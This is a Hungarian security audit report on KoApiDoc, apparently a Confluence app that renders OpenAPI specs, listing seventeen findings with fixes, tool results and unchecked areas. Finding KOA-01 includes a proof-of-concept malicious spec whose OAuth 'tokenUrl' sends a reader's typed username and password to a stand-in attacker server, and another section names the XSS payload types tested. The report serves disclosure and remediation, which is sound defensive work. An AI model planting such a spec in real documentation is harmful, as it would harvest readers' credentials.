# KoApiDoc – kiberbiztonsági audit, 2026-10-02

Alap: `main` @ `50950cf`. Terv: [`docs/SECURITY-AUDIT-PLAN.md`](../SECURITY-AUDIT-PLAN.md).
Minden ellenőrzés lokálisan, a repón és a lokális mockon futott; Atlassian site-ra semmi nem
települt, a GitHub-beállításokat csak olvastuk.

## 1. Vezetői összefoglaló

Kritikus vagy magas súlyosságú hiba **nincs**. A legfontosabb terület (a spec renderelése, XSS)
rendben van: 14 féle XSS-payload egyike sem futott le, a "Try it out" valóban ki van kapcsolva, a
saját kód nem ír nyers HTML-t, és a production bundle nem tartalmaz mock kódot.

A legfontosabb találat: **a Swagger UI "Authorize" párbeszédablaka aktív maradt**. Egy
rosszindulatú spec ezen keresztül a megadott külső címre nyithat popupot (adathalászat egy
megbízható Confluence-oldalról), és az olvasó által beírt felhasználónevet/jelszót POST-tal
elküldheti a spec-ben megadott `tokenUrl`-re (lokálisan reprodukálva). Élesben a Forge CSP
valószínűleg blokkolja a POST-ot, a popupot viszont nem; ez ellentmond a `SECURITY.md` és a
`PRIVACY.md` állításainak is.

| Súlyosság | Darab | Találatok                                  |
| --------- | ----: | ------------------------------------------ |
| Kritikus  |     0 | –                                          |
| Magas     |     0 | –                                          |
| Közepes   |     5 | KOA-01, KOA-02, KOA-03, KOA-04, KOA-05     |
| Alacsony  |     8 | KOA-06 … KOA-13                            |
| Info      |     4 | KOA-14 … KOA-17                            |

Javasolt sorrend: KOA-01 + KOA-02 (egy PR, a kettő együtt zárja le az "Authorize" utat), majd
KOA-05, KOA-03, KOA-04 (egy CI-hardening PR), utána az alacsonyak.

## 2. Találatok

Státusz minden találatnál: **nyitott** (az audit nem javított semmit).

### Közepes

#### KOA-01 – Az "Authorize" párbeszédablak spec-vezérelt külső kéréseket enged

- **Terület:** B (renderelés) · **Hely:** [`SwaggerView.tsx:26-34`](../../static/macro-ui/src/SwaggerView.tsx#L26)
- **CVSS 3.1 (becslés):** 5.4 – `AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N`
- **Leírás:** a `supportedSubmitMethods={[]}` csak a "Try it out"-ot kapcsolja ki. Ha a spec
  `securitySchemes`/`securityDefinitions` részt tartalmaz, a Swagger UI megjeleníti az
  "Authorize" gombot (és a lakat ikonokat az operációknál):
  - OAuth2 `implicit` / `authorizationCode` flow: kattintásra `window.open` a spec-ben megadott
    `authorizationUrl`-re (pl. hamis Atlassian bejelentkező oldal).
  - OAuth2 `password` / `clientCredentials` flow: az olvasó által beírt felhasználónév, jelszó,
    client secret POST-tal megy a spec-ben megadott `tokenUrl`-re.
- **PoC (lokális mock, Playwright):**
  ```json
  { "openapi": "3.0.3", "info": { "title": "x", "version": "1" },
    "paths": { "/x": { "get": { "security": [{ "o": [] }], "responses": { "200": { "description": "ok" } } } } },
    "components": { "securitySchemes": { "o": { "type": "oauth2",
      "flows": { "password": { "tokenUrl": "http://127.0.0.1:5999/token", "scopes": {} } } } } } }
  ```
  Eredmény a támadó szerveren: `POST /token`, body:
  `grant_type=password&username=reader%40example.com&password=hunter2`.
  Implicit flow-val: popup nyílt a `http://127.0.0.1:5999/oauth-authorize?...` címre.
- **Élesben:** a POST-ot a Forge CSP `connect-src` valószínűleg blokkolja; a popupot (navigáció)
  a CSP nem blokkolja, csak a Forge iframe sandbox, ha nem engedi az `allow-popups`-ot. Élő
  site-on nem ellenőrizve.
- **Javítás:** a `searchPlugin` mellé tenni egy olyan plugint, ami elrejti a gombokat:
  `components: { AuthorizeBtnContainer: () => null, authorizeOperationBtn: () => null }`
  (mindkét név megtalálható a bundle-ben). Regressziós e2e teszt: oauth2 sémás spec mellett
  0 `.btn.authorize` elem.

#### KOA-02 – A kiegészítő CSP nem korlátozza a hálózati kéréseket és az űrlapokat

- **Terület:** B · **Hely:** [`index.html:10-13`](../../static/macro-ui/index.html#L10)
- **Leírás:** a meta CSP csak `img-src`, `object-src`, `base-uri` direktívát ad. Hiányzik a
  `default-src`, `script-src`, `connect-src`, `form-action`, `frame-src`. Így a védelem teljes
  egészében a Forge CSP-n múlik (pl. a KOA-01 token POST-jánál).
- **Ellenőrzés:** a mock buildben kipróbáltuk ezt a policyt:
  `default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; font-src 'self' data:; connect-src 'self'; frame-src 'none'; form-action 'none'; object-src 'none'; base-uri 'self'`.
  A Swagger UI hibátlanul renderelt, a KOA-01 token POST-ja blokkolva lett (a popup nem, ahhoz
  a KOA-01 javítása kell).
- **Javítás:** a fenti policy átvétele, `npm run test:e2e` futtatása, majd ellenőrzés egy Forge
  dev site-on (a `@forge/bridge` postMessage-et használ, de élőben is meg kell nézni).

#### KOA-03 – A Forge titkok a teljes `build` job minden lépéséhez hozzáférnek

- **Terület:** E · **Hely:** [`ci.yml:14-16`](../../.github/workflows/ci.yml#L14)
- **Leírás:** a `FORGE_EMAIL` és `FORGE_API_TOKEN` job szintű `env`. Így az `npm ci` (a függőségek
  install scriptjei), a tesztek és a build is látja a tokent; egy kompromittált csomag kiviheti.
  Fork PR-eknél a GitHub nem ad titkot, de a `claude/*` ágakról nyitott PR-eknél és a `main`
  push-nál igen. Jelenleg nincs beállított repo-titok (a `forge lint` lépés kimarad), tehát a
  kockázat most látens.
- **Javítás:** az `env` átköltöztetése csak a `forge lint` lépésre (a feltétel
  `secrets.FORGE_API_TOKEN != ''` alakra), dedikált GitHub Environment használata, és a
  `npm ci --ignore-scripts` megfontolása.

#### KOA-04 – A GitHub Actions nincsenek commit SHA-ra rögzítve

- **Terület:** E · **Hely:** `ci.yml:18, 19, 45, 46, 57`
- **Leírás:** `actions/checkout@v4`, `actions/setup-node@v4`, `actions/upload-artifact@v4` mozgatható
  tagek. A repóban `allowed_actions: all` és `sha_pinning_required: false`. (zizmor `unpinned-uses`,
  semgrep `github-actions-mutable-action-tag`.)
- **Javítás:** teljes 40 karakteres SHA + verzió-komment; repo beállításban
  "Require actions to be pinned to a full-length commit SHA" és csak GitHub/verified actionök
  engedélyezése.

#### KOA-05 – `pull_request_target` job self-hosted runneren, nyilvános repóban

- **Terület:** E · **Hely:** [`close-external-prs.yml:3-12`](../../.github/workflows/close-external-prs.yml#L3)
- **Leírás:** a repó nyilvános. Bármely GitHub-felhasználó PR-nyitása elindít egy jobot a
  self-hosted runneren, `pull-requests: write` tokennel, jóváhagyás nélkül (a
  `pull_request_target` nem kér jóváhagyást). A job nem futtat PR-kódot és a változók env-ben
  mennek (nincs injection), ez jó. A kockázat a runner kitettsége: a GitHub nyilvános repókhoz
  nem javasol self-hosted runnert, és ha a runner csoport engedi a nyilvános repókat, egy fork PR,
  ami a `ci.yml`-t `runs-on: self-hosted`-ra írja át, jóváhagyás után kódot futtatna rajta.
  Enyhítés (ellenőrizve): a fork PR-ek workflowjai minden külső közreműködőnél jóváhagyást
  igényelnek (`approval_policy: all_external_contributors`). A runner izolációja és a
  runner-csoport beállítása nem volt ellenőrizhető (nincs `admin:org` jog).
- **Javítás:** `runs-on: ubuntu-latest` (a job csak egy `gh pr close`). Ha marad a
  self-hosted: ephemeral runner, a runner-csoport ne engedje a nyilvános repókat, és csak erre a
  workflow-ra legyen korlátozva.

### Alacsony

#### KOA-06 – Mélyen beágyazott külső `$ref` megkerüli a cserét

- **Terület:** C · **Hely:** [`externalRefs.ts:1,19`](../../static/macro-ui/src/lib/externalRefs.ts#L19)
- **Leírás:** a bejárás 200 szint után változatlanul adja vissza a csomópontot, így a 200 szintnél
  mélyebb külső `$ref` nem cserélődik le és nem jelenik meg a figyelmeztetés (reprodukálva:
  205 szint, figyelmeztetés: 0). Lokálisan a Swagger UI nem kérte le (csak kibontáskor oldaná
  fel), és élesben a Forge CSP, a KOA-02 után a saját CSP is blokkolja. A dokumentáció szerint
  "never fetched".
- **Javítás:** iteratív, mélységkorlát nélküli bejárás (mint `exceedsNodes`), vagy a túl mély
  dokumentum elutasítása érthető hibával.

#### KOA-07 – Az attachment-tulajdonos ellenőrzése nyitva hagy, ha nincs `pageId`

- **Terület:** C · **Hely:** [`confluenceSpecSource.ts:57-58`](../../static/macro-ui/src/lib/confluenceSpecSource.ts#L57)
- **Leírás:** `owner !== undefined && ...`: ha a v2 metaadatban nincs `pageId` (blogposzt vagy custom
  content attachmentje: ott `blogPostId` / `customContentId` van), az ellenőrzés kimarad. Egy
  szerkesztő kézzel (ADF/REST) beírhat egy másik tartalom attachment ID-ját. Jogosultság-túllépés
  nincs, mert minden kérés a néző jogaival fut, de a `SECURITY.md` "attachments of other pages
  are rejected" állítása így nem teljesen igaz. Élő site-on nem ellenőriztük, hogy a v1 download
  végpont maga is ellenőrzi-e a szülőt.
- **Javítás:** `pageId ?? blogPostId ?? customContentId` egyezzen a `pageId`-val; ha egyik sincs,
  elutasítás (`missing`).

#### KOA-08 – A beillesztett (inline) specnek és a JSON-nak nincs méret-/komplexitáskorlátja

- **Terület:** C · **Hely:** [`parseSpec.ts:46`](../../static/macro-ui/src/lib/parseSpec.ts#L46), `ConfigMacro.tsx`
- **Leírás:** a 2 MB korlát csak az attachmentekre vonatkozik, a csomópontszám-korlát csak YAML-re.
  Egy szerkesztő tetszőleges méretű JSON-t illeszthet be, amit minden olvasó böngészője feldolgoz.
  Mérés: 2,6 MB-os inline spec 1,6 s alatt renderelt (tehát a jelenlegi méreteknél nem fagy), a
  felső határt a Confluence macro-config limitje adja (nem ismert).
- **Javítás:** a `MAX_SPEC_BYTES` alkalmazása az inline szövegre is (konfigban figyelmeztetés,
  nézetben elutasítás), és az `exceedsNodes` JSON-ra is.

#### KOA-09 – A letöltés teljes egészében memóriába kerül a méretellenőrzés előtt

- **Terület:** C · **Hely:** [`confluenceSpecSource.ts:60-67,130`](../../static/macro-ui/src/lib/confluenceSpecSource.ts#L60)
- **Leírás:** a metaadat `fileSize` hiánya esetén 0 lesz, így az előzetes ellenőrzés átengedi; a
  metaadat és a letöltés között cserélt fájl (TOCTOU) is átjut. Mindkét esetben a teljes válasz a
  memóriába kerül, és csak utána jön a 2 MB-os ellenőrzés.
- **Javítás:** hiányzó `fileSize` = ismeretlen → elutasítás; `Content-Length` ellenőrzése, illetve
  stream-olvasás 2 MB-os megszakítással, ha a bridge válasza ad `body`-t.

#### KOA-10 – Ismert sérülékenységek a fejlesztői függőségekben (`@forge/cli`)

- **Terület:** D · **Hely:** `package-lock.json`
- **Leírás:** `npm audit` (root): 31 advisory (2 kritikus, 14 magas, 10 közepes, 5 alacsony), mind a
  `@forge/cli` 14.1.0 (legfrissebb) tranzitív függősége (`shell-quote`, `websocket-driver`,
  `adm-zip`, `ws`, `lodash`, `tar-fs`, ...). OSV-Scanner ugyanezt adja. A production csomagok
  tiszták (`npm audit --omit=dev`: 0, `static/macro-ui`: 0, OSV: 0). A `RELEASING.md` "Known audit
  exceptions" része már dokumentálja. A fejlesztői gépet és a CI-t érinti, ha `forge` parancs fut.
- **Javítás:** elfogadott kockázat; minden kiadás előtt újraellenőrzés, `@forge/cli` frissítése,
  amint új verzió jön.

#### KOA-11 – GitHub repó-hardening hiányosságok

- **Terület:** H
- **Leírás (gh API alapján):**
  - Secret scanning **push protection kikapcsolva** (a secret scanning maga be van kapcsolva).
  - Dependabot security updates kikapcsolva, nincs `.github/dependabot.yml` (szándékos, a
    `RELEASING.md` leírja; a Dependabot alerts be van kapcsolva).
  - Nincs code scanning (CodeQL).
  - "Protect main" ruleset: PR kötelező, de **0 jóváhagyás**, `require_last_push_approval: false`,
    és az admin szerep mindig megkerülheti (`bypass_mode: always`); két admin van.
- **Javítás:** push protection bekapcsolása; Dependabot security updates (vagy legalább a
  `github-actions` ökoszisztéma a KOA-04 frissítéséhez); CodeQL default setup; a bypass
  `pull_request` módra állítása.

#### KOA-12 – `actions/checkout` megtartja a tokent a munkakönyvtárban

- **Terület:** E · **Hely:** `ci.yml:18, 45` (zizmor `artipacked`)
- **Leírás:** `persist-credentials` alapértelmezetten `true`, a `GITHUB_TOKEN` a `.git/config`-ba
  kerül, és minden későbbi lépés (függőségek scriptjei) olvashatja. Az artifact csak az
  `e2e/test-results/`-t tölti fel, így a token nem kerül artifactba. A token csak olvasási jogú.
- **Javítás:** `with: { persist-credentials: false }`.

#### KOA-13 – A dokumentáció néhány állítása nem pontos

- **Terület:** G · **Hely:** `SECURITY.md`, `docs/PRIVACY.md`, `docs/MARKETPLACE-LISTING.md`
- **Leírás:**
  - `SECURITY.md`: "no request is ever sent to the API described by a specification" és
    `PRIVACY.md`: "It does not send data outside Atlassian" – az "Authorize" ablakon át igen
    (KOA-01).
  - `SECURITY.md`: "attachments of other pages are rejected" – csak ha van `pageId` (KOA-07).
  - `SECURITY.md`: "`$ref`s to other files or URLs are never fetched; they are replaced" – 200 szint
    alatt igaz (KOA-06).
- **Javítás:** a KOA-01/06/07 javítása után a szövegek igazak lesznek; ha valamelyik javítás
  elmarad, a szöveget kell pontosítani a Marketplace-beadás előtt.

### Info

#### KOA-14 – `__proto__` kulcs a specben a másolatok prototípusát módosítja

- **Hely:** [`externalRefs.ts:29`](../../static/macro-ui/src/lib/externalRefs.ts#L29), [`specFilter.ts:118-135`](../../static/macro-ui/src/lib/specFilter.ts#L118)
- `out[key] = ...` egy `__proto__` kulcsnál a másolat prototípusát állítja be, nem az
  `Object.prototype`-ot. Globális prototype pollution nincs (ellenőrizve: `({}).polluted`
  `undefined`; a js-yaml 5.4.2 saját kulcsként olvassa be a `__proto__`-t). Hardening:
  `Object.defineProperty(out, key, { value, enumerable: true, writable: true, configurable: true })`.

#### KOA-15 – A lapozási link `..` szegmenseket is átenged

- **Hely:** [`confluenceSpecSource.ts:44`](../../static/macro-ui/src/lib/confluenceSpecSource.ts#L44)
- A `startsWith('/wiki/api/v2/')` átengedi például ezt: `/wiki/api/v2/../../rest/...`. A linket a
  Confluence adja (megbízható), a kérés csak olvas és a néző jogaival fut. Hardening:
  `new URL(next, 'https://x').pathname` normalizálása után ellenőrizni.

#### KOA-16 – A fejlesztői mock `postMessage('*')`-ot használ, a `local.html` nem ellenőrzi az origint

- **Hely:** `dev/bridge-mock.ts:194,197,204`, `local.html:141` (semgrep)
- Csak a lokális fejlesztésben fut; ellenőrizve, hogy a `dist` nem tartalmaz mock kódot.

#### KOA-17 – Üres, de exportált resolver; placeholder `app.id`

- **Hely:** [`src/index.ts`](../../src/index.ts), [`manifest.yml:29`](../../manifest.yml#L29)
- A resolvernek nincs definíciója, így nincs támadási felülete; amíg nem kell, akár el is
  hagyható a manifestből. Az `app.id` placeholder a `forge register` előtt várt állapot.

## 3. Rendben talált területek

- **XSS (B):** 14 payload (`<script>`, `onerror`, SVG, `<iframe>`, `<form>`, `<details ontoggle>`,
  mXSS, `javascript:`/`data:` linkek, CSS `url()`, Markdown kép/link) az `info`, `tags`,
  `externalDocs`, `servers`, operáció, paraméter, válasz és séma leírásokban, Swagger 2.0 és
  OpenAPI 3.0 alatt: semmi nem futott le, 0 `on*` attribútum, 0 iframe/form. A `javascript:`
  linkek `about:blank`-re cserélődnek vagy eltűnnek; a `target=_blank` linkeken
  `rel="noopener noreferrer"` van. A DOMPurify verziója 3.4.16.
- **Try it out:** 0 gomb Swagger 2.0 és OpenAPI 3 alatt. A validator badge nem jelenik meg, nem
  ment kérés a `validator.swagger.io`-ra.
- **Saját kód:** nincs `dangerouslySetInnerHTML`, `innerHTML`, `eval`, `new Function`, és a
  szöveg csak Reacton keresztül jelenik meg.
- **Külső hivatkozások:** OpenAPI 3.1 `$id` + lokális `$ref`, `$dynamicRef`, `externalValue`:
  nem ment ki kérés.
- **Bemenet/DoS (C):** YAML-bomba 10⁷ értékkel elutasítva; 1,2 M értékkel (a limit alatt) ~2 s
  alatt renderel; önmagára hivatkozó anchor elutasítva; 20 000 szint mély JSON: hibaüzenet, nem
  fagy; 10 000 karakteres keresés 37 ms; a reguláris kifejezések lineárisak (nincs ReDoS); a
  js-yaml nem ismeri a `!!js/*` tageket. Az ID-validálás (`^\d+$`, `^(att)?\d+$`) a REST-útvonal
  előtt fut.
- **Manifest (A):** két csak olvasó scope, mindkettő kell (v2 lista/metaadat, v1 letöltés); nincs
  `external` egress, nincs `asApp` hívás, minden kérés `requestConfluence`-szel a néző nevében.
- **Build (D):** a `dist` nem tartalmaz mock kódot, fixture-t és sourcemapet. A swagger-ui kódjában
  levő `localStorage` és `document.cookie` csak `persistAuthorization` mellett aktív, ami ki van
  kapcsolva (ellenőrizve: a cookie üres maradt).
- **Titkok (F):** gitleaks a teljes historyn és a munkakönyvtáron: nincs találat. A
  `.gitignore` lefedi a `.env`-et és a `.forge/`-ot. A marketing PDF és a screenshotok nem
  tartalmaznak belső URL-t vagy személyes adatot.
- **CI (E):** a workflow-k alapértelmezett jogosultsága `contents: read`; a `close-external-prs`
  nem csekkol ki PR-kódot, a változókat env-ben kapja, az `if` feltétel nem kerülhető meg (a
  `claude/*` ág csak a saját repóból számít). actionlint: 0 hiba.
- **Repó (H):** privát sérülékenység-bejelentés bekapcsolva, secret scanning bekapcsolva; a
  `main` védett (PR + kötelező `build` és `e2e` check, force push és törlés tiltva); a `v*` tagek
  védettek; a fork PR-ek workflowjai jóváhagyást igényelnek; a `CONTRIBUTING.md` létezik.

## 4. Eszközök és kimenetek

| Eszköz                         | Cél                                  | Eredmény                                                                  |
| ------------------------------ | ------------------------------------ | ------------------------------------------------------------------------- |
| `npm audit` (root)             | fejlesztői függőségek                | 31 (2 kritikus, 14 magas), mind `@forge/cli` alatt → KOA-10               |
| `npm audit --omit=dev` (root)  | production                           | 0                                                                         |
| `npm audit` (`static/macro-ui`) | a kiadott bundle függőségei         | 0                                                                         |
| OSV-Scanner 2.x                | mindkét lockfile                     | root: ugyanaz, mint az npm audit; `macro-ui`: 0                           |
| gitleaks                       | git history + munkakönyvtár          | 0                                                                         |
| Semgrep 1.176 (`p/javascript`, `p/typescript`, `p/react`, `p/secrets`, `p/github-actions`) | kód + workflow-k | 8: 5× nem pinelt action (KOA-04), 3× `postMessage('*')` a mockban (KOA-16) |
| zizmor (auditor persona)       | workflow-k                           | `unpinned-uses` ×5, `dangerous-triggers`, `self-hosted-runner`, `secrets-outside-env` ×2, `artipacked` ×2, `excessive-permissions` → KOA-03/04/05/12 |
| actionlint                     | workflow szintaxis                   | 0                                                                         |
| Playwright (lokális mock)      | dinamikus tesztek, 16 rosszindulatú spec | KOA-01, KOA-06; a többi rendben (3. fejezet)                          |
| `gh api` (csak olvasás)        | repó-beállítások                     | KOA-11                                                                    |

### Hamis pozitívok, elvetett jelzések

- zizmor `excessive-permissions` (`close-external-prs.yml`): a `pull-requests: write` a PR
  lezárásához kell, más jog nincs megadva.
- zizmor `dangerous-triggers`: a `pull_request_target` itt nem futtat PR-kódot; a valós kockázat a
  runner (KOA-05).
- Semgrep `wildcard-postmessage-configuration`: csak a fejlesztői mock (KOA-16, info).
- `npm audit` kritikus találatok: csak fejlesztői eszköz, nem kerülnek a bundle-be (KOA-10).

## 5. Nem ellenőrzött területek

- A Forge platform tényleges CSP-je és iframe sandboxa élő site-on (KOA-01 és KOA-02 éles hatása).
- `forge lint` (nincs Forge login).
- A self-hosted runner és a runner-csoport beállítása (nincs `admin:org` jog).
- Hogy a v1 attachment-letöltő végpont ellenőrzi-e a szülő tartalmat (KOA-07).
- A Confluence macro-config méretkorlátja (KOA-08).

## 6. Következő lépések

1. PR: KOA-01 (Authorize UI elrejtése) + KOA-02 (szigorúbb CSP), regressziós tesztekkel
   (`tests/fixtures/malicious/*`: oauth2 password/implicit flow, mély `$ref`, `__proto__`).
2. PR: CI-hardening – KOA-05, KOA-03, KOA-04, KOA-12.
3. PR: bemenetkezelés – KOA-06, KOA-07, KOA-08, KOA-09, KOA-14, KOA-15.
4. Repó-beállítások kézzel – KOA-11.
5. A dokumentáció frissítése a javítások után – KOA-13.
6. Élő Forge dev site-on: a KOA-01/02 javítás és a CSP ellenőrzése.
